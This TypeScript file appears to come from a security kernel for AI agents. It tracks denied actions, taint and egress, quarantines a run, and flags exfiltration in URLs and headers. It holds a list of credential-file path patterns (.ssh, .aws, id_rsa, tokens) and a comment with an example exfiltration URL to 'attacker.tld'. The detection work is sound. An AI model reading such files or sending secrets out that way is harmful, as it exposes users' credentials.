/**
 * Run-level state tracker for stateful enforcement.
 *
 * Tracks cumulative behavior counters and a recent-event window
 * across an entire agent run. When thresholds are exceeded or
 * behavioral sequence rules match, the run enters "restricted mode"
 * which limits the agent to read-only safe actions.
 */

import type { TaintLabel, TaintState } from "@arikernel/core";
import { normalizeInput } from "./unicode-safety.js";

export interface RunStatePolicy {
	/** Number of denied sensitive actions before entering restricted mode. Default: 5 */
	maxDeniedSensitiveActions?: number;
	/** Whether behavioral sequence rules are enabled. Default: true */
	behavioralRules?: boolean;
	/** Hostnames exempted from post-sensitive-read egress tightening. */
	egressAllowHosts?: string[];
}

export interface RunStateCounters {
	deniedActions: number;
	capabilityRequests: number;
	deniedCapabilityRequests: number;
	externalEgressAttempts: number;
	sensitiveFileReadAttempts: number;
}

// ── Recent-event window types ──────────────────────────────────────

export type SecurityEventType =
	| "capability_requested"
	| "capability_denied"
	| "capability_granted"
	| "tool_call_allowed"
	| "tool_call_denied"
	| "taint_observed"
	| "sensitive_read_attempt"
	| "sensitive_read_allowed"
	| "egress_attempt"
	| "quarantine_entered";

export interface SecurityEvent {
	timestamp: string;
	type: SecurityEventType;
	toolClass?: string;
	action?: string;
	verdict?: "allow" | "deny" | "require-approval";
	taintSources?: string[];
	metadata?: Record<string, unknown>;
}

// ── Quarantine metadata ────────────────────────────────────────────

export type QuarantineTrigger = "threshold" | "behavioral_rule";

export interface QuarantineInfo {
	triggerType: QuarantineTrigger;
	ruleId?: string;
	reason: string;
	countersSnapshot: RunStateCounters;
	matchedEvents?: SecurityEvent[];
	timestamp: string;
}

// ── Cumulative egress tracking ─────────────────────────────────────

export interface HostnameEgressRecord {
	totalQueryBytes: number;
	requestCount: number;
}

// ── Constants ──────────────────────────────────────────────────────

/** Risk ordering for tool classes — used by escalation denial sticky flag. */
const TOOL_CLASS_RISK_MAP: Record<string, number> = {
	http: 1,
	database: 2,
	file: 3,
	shell: 5,
};

const MAX_EVENT_WINDOW = 20;

/**
 * Actions considered "safe read-only" that are still allowed in restricted mode.
 *
 * HTTP GET/HEAD are allowed for content ingress (fetching pages to read).
 * Suspicious GET exfil patterns (large query strings, data-bearing params)
 * are caught separately by isSuspiciousGetExfil() in the pipeline.
 *
 * True egress methods (POST/PUT/PATCH/DELETE) are always blocked in quarantine.
 */
const SAFE_READONLY_ACTIONS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
	["http", new Set(["get", "head", "options"])],
	["file", new Set(["read"])],
	["database", new Set(["query"])],
]);

/** Sensitive file path patterns that count toward sensitiveFileReadAttempts. */
const SENSITIVE_PATH_PATTERNS = [
	/\.ssh/i,
	/\.env/i,
	/\.aws/i,
	/credentials/i,
	/password/i,
	/secret/i,
	/\.gnupg/i,
	/id_rsa/i,
	/\.kube\/config/i,
	/token/i,
];

export class RunStateTracker {
	readonly counters: RunStateCounters = {
		deniedActions: 0,
		capabilityRequests: 0,
		deniedCapabilityRequests: 0,
		externalEgressAttempts: 0,
		sensitiveFileReadAttempts: 0,
	};

	private readonly _eventWindow: SecurityEvent[] = [];
	private _restricted = false;
	private _restrictedAt: string | null = null;
	private _quarantineInfo: QuarantineInfo | null = null;
	private _tainted = false;
	private _taintSources: Set<string> = new Set();
	private _accumulatedTaintLabels: TaintLabel[] = [];

	// ── Sticky state flags (H1 hardening) ──────────────────────────
	// These persist for the entire run and survive event window eviction.
	// Behavioral rules consult these so that an attacker cannot evade
	// detection by spacing steps across >20 events.
	private _sensitiveReadObserved = false;
	private _egressObserved = false;
	private _secretAccessObserved = false;
	private _escalationDeniedObserved = false;
	private _escalationDeniedClasses: Set<string> = new Set();
	private _quarantineGetCount = 0;
	private readonly _egressByHostname = new Map<string, HostnameEgressRecord>();
	private readonly _egressAllowHosts: ReadonlySet<string>;
	private readonly threshold: number;
	readonly behavioralRulesEnabled: boolean;
	/** The policy configuration used to construct this tracker. */
	readonly policy: RunStatePolicy | undefined;

	constructor(policy?: RunStatePolicy) {
		this.policy = policy;
		this.threshold = policy?.maxDeniedSensitiveActions ?? 5;
		this.behavioralRulesEnabled = policy?.behavioralRules !== false;
		this._egressAllowHosts = new Set(policy?.egressAllowHosts ?? []);
	}

	get restricted(): boolean {
		return this._restricted;
	}

	get restrictedAt(): string | null {
		return this._restrictedAt;
	}

	get quarantineInfo(): QuarantineInfo | null {
		return this._quarantineInfo;
	}

	/**
	 * Whether the run has been tainted by untrusted external input.
	 * Once set, this flag never resets — it persists for the entire run.
	 */
	get tainted(): boolean {
		return this._tainted;
	}

	/** Set of taint source types observed during this run. */
	get taintSources(): ReadonlySet<string> {
		return this._taintSources;
	}

	/** Whether a sensitive file read was observed at any point during this run. Sticky. */
	get sensitiveReadObserved(): boolean {
		return this._sensitiveReadObserved;
	}

	/** Whether an egress attempt was observed at any point during this run. Sticky. */
	get egressObserved(): boolean {
		return this._egressObserved;
	}

	/** Whether a secret/credential access was observed at any point during this run. Sticky. */
	get secretAccessObserved(): boolean {
		return this._secretAccessObserved;
	}

	/** Whether a capability denial was observed at any point during this run. Sticky. */
	get escalationDeniedObserved(): boolean {
		return this._escalationDeniedObserved;
	}

	/** The set of all tool classes that have been denied (for escalation risk comparison). */
	get escalationDeniedClasses(): ReadonlySet<string> {
		return this._escalationDeniedClasses;
	}

	/**
	 * The highest-risk denied tool class, derived from the full set.
	 * Returns null if no capability has been denied yet.
	 */
	get escalationDeniedToolClass(): string | null {
		if (this._escalationDeniedClasses.size === 0) return null;
		let max: string | null = null;
		let maxRisk = -1;
		for (const tc of this._escalationDeniedClasses) {
			const risk = TOOL_CLASS_RISK_MAP[tc] ?? 0;
			if (risk > maxRisk) {
				maxRisk = risk;
				max = tc;
			}
		}
		return max;
	}

	/** Mark that a capability was denied. Adds to the full set — survives window eviction. */
	markEscalationDenied(toolClass: string): void {
		this._escalationDeniedObserved = true;
		this._escalationDeniedClasses.add(toolClass);
	}

	// ── Cross-run seeder methods (NF-05) ──────────────────────────────
	// Called by PersistentTaintRegistry.initializeRunState() to propagate
	// sticky flags from prior runs without unsafe (as any) casts.

	/** Seed sensitive-read sticky flag from a prior persistent run. */
	seedSensitiveRead(): void {
		this._sensitiveReadObserved = true;
	}

	/** Seed secret-access sticky flag from a prior persistent run. */
	seedSecretAccess(): void {
		this._secretAccessObserved = true;
		this._sensitiveReadObserved = true;
	}

	/** Seed egress-observed sticky flag from a prior persistent run. */
	seedEgress(): void {
		this._egressObserved = true;
	}

	/** Mark the run as tainted by an external source. Sticky — never resets. */
	markTainted(source: string): void {
		this._tainted = true;
		this._taintSources.add(source);
	}

	/**
	 * Accumulate taint labels into the run-level taint state.
	 *
	 * Deduplicates by source:origin key so repeated labels don't bloat the set.
	 * This is the kernel's independent taint record — it persists even if tools
	 * or agents omit taint metadata from subsequent calls.
	 */
	accumulateTaintLabels(labels: TaintLabel[]): void {
		for (const label of labels) {
			const key = `${label.source}:${label.origin}`;
			if (!this._accumulatedTaintLabels.some((l) => `${l.source}:${l.origin}` === key)) {
				this._accumulatedTaintLabels.push(label);
			}
			this.markTainted(label.source);
		}
	}

	/** Read-only view of accumulated taint labels for the run. */
	get accumulatedTaintLabels(): readonly TaintLabel[] {
		return this._accumulatedTaintLabels;
	}

	/** Snapshot the kernel-maintained taint state for this run. */
	get taintState(): TaintState {
		return {
			tainted: this._tainted,
			sources: [...this._taintSources],
			labels: [...this._accumulatedTaintLabels],
		};
	}

	/** Read-only view of recent events. */
	get recentEvents(): readonly SecurityEvent[] {
		return this._eventWindow;
	}

	/**
	 * Maximum HTTP GETs with query parameters allowed after quarantine.
	 * Prevents slow-drip exfiltration via small GET requests that individually
	 * pass isSuspiciousGetExfil() thresholds.
	 */
	static readonly MAX_QUARANTINE_GETS_WITH_PARAMS = 3;

	/** Count of HTTP GETs with query params since quarantine. */
	get quarantineGetCount(): number {
		return this._quarantineGetCount;
	}

	/** Record a GET-with-params in quarantine mode. Returns true if budget exhausted. */
	recordQuarantineGet(): boolean {
		this._quarantineGetCount++;
		// After sensitive read, budget is 0 — block ALL parameterized GETs
		if (this._sensitiveReadObserved) return true;
		return this._quarantineGetCount > RunStateTracker.MAX_QUARANTINE_GETS_WITH_PARAMS;
	}

	/** Record cumulative HTTP GET egress bytes for a hostname. */
	recordHttpGetEgress(url: string): void {
		try {
			const parsed = new URL(url);
			const hostname = parsed.hostname;
			const queryBytes = parsed.search.length;
			const record = this._egressByHostname.get(hostname) ?? {
				totalQueryBytes: 0,
				requestCount: 0,
			};
			record.totalQueryBytes += queryBytes;
			record.requestCount++;
			this._egressByHostname.set(hostname, record);
		} catch {
			/* ignore invalid URLs */
		}
	}

	/** Get cumulative egress record for a hostname. */
	getCumulativeEgress(hostname: string): HostnameEgressRecord | undefined {
		return this._egressByHostname.get(hostname);
	}

	/** Check if a hostname is in the egress allowlist. */
	isAllowlistedHost(hostname: string): boolean {
		return this._egressAllowHosts.has(hostname);
	}

	/** Total cumulative query-string bytes across all hostnames. */
	get totalEgressQueryBytes(): number {
		let total = 0;
		for (const record of this._egressByHostname.values()) {
			total += record.totalQueryBytes;
		}
		return total;
	}

	/** Check if an action is allowed in restricted mode. */
	isAllowedInRestrictedMode(toolClass: string, action: string): boolean {
		return SAFE_READONLY_ACTIONS.get(toolClass)?.has(action) ?? false;
	}

	/** Push a security event into the recent window. */
	pushEvent(event: SecurityEvent): void {
		this._eventWindow.push(event);
		if (this._eventWindow.length > MAX_EVENT_WINDOW) {
			this._eventWindow.shift();
		}
	}

	/** Enter quarantine via behavioral rule. Returns QuarantineInfo if newly quarantined. */
	quarantineByRule(
		ruleId: string,
		reason: string,
		matchedEvents: SecurityEvent[],
	): QuarantineInfo | null {
		if (this._restricted) return null;
		const info: QuarantineInfo = {
			triggerType: "behavioral_rule",
			ruleId,
			reason,
			countersSnapshot: { ...this.counters },
			matchedEvents,
			timestamp: new Date().toISOString(),
		};
		this._restricted = true;
		this._restrictedAt = info.timestamp;
		this._quarantineInfo = info;
		this.pushEvent({
			timestamp: info.timestamp,
			type: "quarantine_entered",
			metadata: { ruleId, reason },
		});
		return info;
	}

	/** Record a denied action and check if we should enter restricted mode. */
	recordDeniedAction(): void {
		this.counters.deniedActions++;
		this.checkThreshold();
	}

	/** Record a capability request. */
	recordCapabilityRequest(granted: boolean): void {
		this.counters.capabilityRequests++;
		if (!granted) {
			this.counters.deniedCapabilityRequests++;
		}
	}

	/** Record an external egress attempt (HTTP write to any host). */
	recordEgressAttempt(): void {
		this.counters.externalEgressAttempts++;
		this._egressObserved = true;
	}

	/**
	 * Record a sensitive file read attempt (pre-policy).
	 * Increments the counter for quarantine threshold checks, but does NOT set
	 * the sticky sensitiveReadObserved flag. That flag is only set when the read
	 * is actually allowed (via confirmSensitiveFileRead()), preventing an attacker
	 * from "framing" a principal by attempting denied sensitive reads to trigger
	 * cross-principal contamination marking.
	 */
	recordSensitiveFileAttempt(): void {
		this.counters.sensitiveFileReadAttempts++;
	}

	/**
	 * Confirm that a sensitive file read was actually executed (post-policy allow).
	 * Sets the sticky sensitiveReadObserved flag which is used for:
	 * - Cross-principal contamination marking (shared taint registry)
	 * - Post-sensitive-read egress restrictions
	 *
	 * Only call this AFTER policy evaluation allows the read AND execution succeeds.
	 */
	confirmSensitiveFileRead(): void {
		this._sensitiveReadObserved = true;
	}

	/** Mark that a secret/credential resource was accessed. Sticky. */
	markSecretAccess(): void {
		this._secretAccessObserved = true;
	}

	/** Check if a file path targets a sensitive location. NFKC-normalized to prevent homoglyph bypass. */
	isSensitivePath(path: string): boolean {
		const normalized = normalizeInput(path);
		return SENSITIVE_PATH_PATTERNS.some((p) => p.test(normalized));
	}

	/**
	 * Check if an HTTP action is a true egress (outbound write) attempt.
	 * Only write methods are egress. GET/HEAD are ingress (content fetch).
	 * Suspicious GET-based exfil is detected separately by isSuspiciousGetExfil().
	 */
	isEgressAction(action: string): boolean {
		return ["post", "put", "patch", "delete"].includes(action);
	}

	private checkThreshold(): void {
		if (this._restricted) return;
		if (this.counters.deniedActions >= this.threshold) {
			const ts = new Date().toISOString();
			this._restricted = true;
			this._restrictedAt = ts;
			this._quarantineInfo = {
				triggerType: "threshold",
				reason: `Denied actions (${this.counters.deniedActions}) exceeded threshold (${this.threshold})`,
				countersSnapshot: { ...this.counters },
				timestamp: ts,
			};
			this.pushEvent({
				timestamp: ts,
				type: "quarantine_entered",
				metadata: { triggerType: "threshold" },
			});
		}
	}
}

// ── Suspicious GET exfil detection ────────────────────────────────

/** Maximum query string length before a GET is flagged as suspicious exfil. */
const MAX_SAFE_QUERY_LENGTH = 256;

/** Maximum single query parameter value length. */
const MAX_SAFE_PARAM_VALUE_LENGTH = 128;

/** Minimum path segment length to consider for entropy analysis. */
const MIN_SUSPICIOUS_SEGMENT_LENGTH = 32;

/** Cumulative path payload budget — total encoded-looking bytes across all segments. */
const MAX_CUMULATIVE_PATH_PAYLOAD = 64;

/** Minimum length for a single path segment to be flagged as hex exfil. */
const MIN_HEX_SEGMENT_LENGTH = 16;

/** Minimum length for a single path segment to be flagged as base32 exfil. */
const MIN_BASE32_SEGMENT_LENGTH = 16;

/** Minimum length for a single path segment to be flagged as base64 path exfil. */
const MIN_BASE64_PATH_SEGMENT_LENGTH = 20;

// ── Path-segment encoding detectors ──────────────────────────────

/** Pure hex: 16+ hex chars (e.g. "4d7953656372657456616c7565"). */
const PATH_HEX_RE = /^[0-9a-fA-F]+$/;

/** Base32-like: 16+ uppercase alpha + digits 2-7, optional padding. */
const PATH_BASE32_RE = /^[A-Z2-7]+=*$/;

/** Base64url-like: 20+ chars from the base64url alphabet (no padding in paths). */
const PATH_BASE64URL_RE = /^[A-Za-z0-9_-]+$/;

/**
 * Check if a path segment looks like an encoded payload (hex, base32, base64url).
 * Returns the segment length if it matches, 0 otherwise.
 * Short segments that match common REST patterns (UUIDs, short IDs) are excluded.
 */
function encodedPathSegmentLength(segment: string): number {
	// Pure hex segment (16+ chars) — catches hex-encoded secrets
	if (segment.length >= MIN_HEX_SEGMENT_LENGTH && PATH_HEX_RE.test(segment)) {
		return segment.length;
	}
	// Base32-like segment (16+ chars)
	if (segment.length >= MIN_BASE32_SEGMENT_LENGTH && PATH_BASE32_RE.test(segment)) {
		// Exclude short all-caps words that aren't base32 (e.g. "ORDERS", "USERS")
		// Real base32 payloads are longer and contain digits 2-7
		if (segment.length < 20 && !/[2-7]/.test(segment)) return 0;
		return segment.length;
	}
	// Base64url-like segment (20+ chars) — must contain mixed case or digits to avoid
	// flagging normal path words like "notifications" or "authentication".
	// Exclude UUID-shaped segments (contains hyphens splitting hex groups).
	if (
		segment.length >= MIN_BASE64_PATH_SEGMENT_LENGTH &&
		!segment.includes("-") &&
		PATH_BASE64URL_RE.test(segment)
	) {
		const hasUpper = /[A-Z]/.test(segment);
		const hasLower = /[a-z]/.test(segment);
		const hasDigit = /[0-9]/.test(segment);
		// Must have at least 2 of: uppercase, lowercase, digits — normal words are single-case
		const mixCount = (hasUpper ? 1 : 0) + (hasLower ? 1 : 0) + (hasDigit ? 1 : 0);
		if (mixCount >= 2) return segment.length;
	}
	return 0;
}

/**
 * Shannon entropy of a string, normalized to [0, 1] relative to the charset.
 * High entropy (>0.7) in long path segments suggests encoded data (base64, hex).
 */
function normalizedEntropy(s: string): number {
	if (s.length === 0) return 0;
	const freq = new Map<string, number>();
	for (const ch of s) {
		freq.set(ch, (freq.get(ch) ?? 0) + 1);
	}
	let entropy = 0;
	for (const count of freq.values()) {
		const p = count / s.length;
		entropy -= p * Math.log2(p);
	}
	// Normalize: max entropy for base64 charset (~64 chars) is log2(64) = 6
	return entropy / 6;
}

/**
 * Detect GET/HEAD requests that appear to be exfiltrating data via query parameters
 * or URL path segments.
 *
 * Heuristic checks:
 * - Query string longer than 256 chars (data smuggling)
 * - Any single query parameter value longer than 128 chars (encoded payload)
 * - Path segments longer than 32 chars with high entropy (base64/hex encoded data)
 *
 * The path-segment check catches exfil patterns like:
 *   GET https://attacker.tld/leak/SGVsbG8gV29ybGQ=
 * where there is no query string but the secret is encoded in the path.
 */
export function isSuspiciousGetExfil(url: string): boolean {
	try {
		const parsed = new URL(url);
		const query = parsed.search;

		// Query string checks
		if (query && query.length > 1) {
			// Long query strings suggest data smuggling
			if (query.length > MAX_SAFE_QUERY_LENGTH) return true;

			// Check individual parameter values for large payloads
			for (const [, value] of parsed.searchParams) {
				if (value.length > MAX_SAFE_PARAM_VALUE_LENGTH) return true;
			}
		}

		// Path segment checks — detect encoded data in URL path
		const segments = parsed.pathname.split("/").filter(Boolean);
		let cumulativeEncodedBytes = 0;
		for (const segment of segments) {
			// Original entropy check for long high-entropy segments
			if (segment.length >= MIN_SUSPICIOUS_SEGMENT_LENGTH && normalizedEntropy(segment) > 0.7) {
				return true;
			}
			// Explicit encoded-payload detection (hex, base32, base64url)
			const encLen = encodedPathSegmentLength(segment);
			if (encLen > 0) {
				// A single encoded segment ≥24 chars is suspicious on its own
				if (encLen >= 24) return true;
				// Accumulate for chunked exfil detection
				cumulativeEncodedBytes += encLen;
			}
		}
		// Cumulative budget: multiple shorter encoded segments add up
		if (cumulativeEncodedBytes > MAX_CUMULATIVE_PATH_PAYLOAD) {
			return true;
		}

		return false;
	} catch {
		return false;
	}
}

// ── Low-entropy encoding detection ───────────────────────────────

/** Base64 with padding: short values need `=` to distinguish from normal words. */
const BASE64_PADDED_RE = /^[A-Za-z0-9+/\-_]{2,}={1,2}$/;
/** Base64 without padding: only flag if 8+ chars (avoids false positives on short words). */
const BASE64_LONG_RE = /^[A-Za-z0-9+/\-_]{8,}$/;
/** Hex pattern: 8+ hex chars (e.g. encoded binary or chunked secrets). */
const HEX_RE = /^[0-9a-fA-F]{8,}$/;

function isBase64Like(value: string): boolean {
	if (value.endsWith("=")) {
		return value.length >= 4 && BASE64_PADDED_RE.test(value);
	}
	return BASE64_LONG_RE.test(value);
}

/**
 * Detect base64 or hex encoded payloads in query parameter values.
 * Catches low-entropy exfiltration where small encoded chunks are
 * smuggled in innocuous-looking query parameters.
 */
export function hasEncodedPayload(url: string): boolean {
	try {
		const parsed = new URL(url);
		for (const [, value] of parsed.searchParams) {
			if (isBase64Like(value) || HEX_RE.test(value)) {
				return true;
			}
		}
		return false;
	} catch {
		return false;
	}
}

// ── Header value exfil detection ──────────────────────────────────

/** Maximum allowed header value length in sensitive context. */
const MAX_HEADER_VALUE_LENGTH = 256;

/**
 * Check if a header value looks like it contains an encoded secret.
 * Reuses the same detectors used for URL path/query exfil:
 * - Base64/base64url patterns
 * - Hex-encoded payloads
 * - Oversized values (>256 chars)
 *
 * Returns a reason string if suspicious, null if clean.
 */
export function suspiciousHeaderValue(name: string, value: string): string | null {
	if (value.length > MAX_HEADER_VALUE_LENGTH) {
		return `header '${name}' value too long (${value.length} > ${MAX_HEADER_VALUE_LENGTH})`;
	}
	// Split on spaces/semicolons/commas/equals to inspect individual tokens
	// (e.g., "Mozilla/5.0 (X11; Linux)" → individual tokens,
	//  "session=4d7953656372657456616c7565" → ["session", "4d79..."])
	const tokens = value.split(/[\s;,=]+/).filter((t) => t.length >= 8);
	for (const token of tokens) {
		if (HEX_RE.test(token) && token.length >= MIN_HEX_SEGMENT_LENGTH) {
			return `header '${name}' contains hex-encoded payload '${token.slice(0, 20)}...'`;
		}
		if (isBase64Like(token) && token.length >= MIN_BASE64_PATH_SEGMENT_LENGTH) {
			// Exclude common browser tokens that look base64-ish but aren't secrets
			// e.g. "AppleWebKit/537.36", "Gecko/20100101"
			if (/^[A-Za-z]+\/[\d.]+$/.test(token)) continue;
			// Require mixed-case or digits to distinguish from normal words
			const hasUpper = /[A-Z]/.test(token);
			const hasLower = /[a-z]/.test(token);
			const hasDigit = /[0-9]/.test(token);
			const mixCount = (hasUpper ? 1 : 0) + (hasLower ? 1 : 0) + (hasDigit ? 1 : 0);
			if (mixCount >= 2) {
				return `header '${name}' contains base64-encoded payload '${token.slice(0, 20)}...'`;
			}
		}
	}
	return null;
}
